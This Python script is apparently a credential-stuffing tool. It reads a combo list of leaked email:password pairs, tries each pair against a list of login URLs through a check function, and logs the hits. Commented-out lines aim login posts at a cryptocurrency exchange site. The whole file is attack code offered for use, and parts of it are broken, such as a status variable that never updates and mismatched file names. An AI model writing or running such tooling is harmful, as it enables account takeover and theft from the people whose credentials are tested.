import requests
from modes.Checker  import check

status=''
count=0

comboStatus = input('pls paste the combolist file in the list folder and name file as comboList  ...type OK if done: ')
urlStatus = input('pls paste the url file in the list folder and name file as urlList ...type OK if done: ')
with open('./lists/comboList.txt', 'r') as emailPass:
    combo_list = emailPass.readlines()
    for combo in combo_list:
        arg = combo.split(':')
        email = arg[0]
        password = arg[1]
        with open('./lists/url_List.txt', 'r') as urls:
            url_list = urls.readlines()
            for url in url_list:
                check(url=url, email=email, password=password)
                if status != "":
                    print(f'this is the email {email}, this is password {password}, this the url {url}')
                    with open('./lists/status', 'a') as stat:
                        stat.write(f'log  {email}, {password}, {url}, {status}......')












#res = requests.post('https://buycoinnow.com/login', auth=(login_email, login_password), verify=True)
##print(res.headers['Content-Type'],res.status_code)


#with requests.Session() as session:
   # res = session.post('https://buycoinnow.com/login', auth=(login_email, login_password), verify=False)

#print(res.status_code, res.headers['content-type'], res.headers)



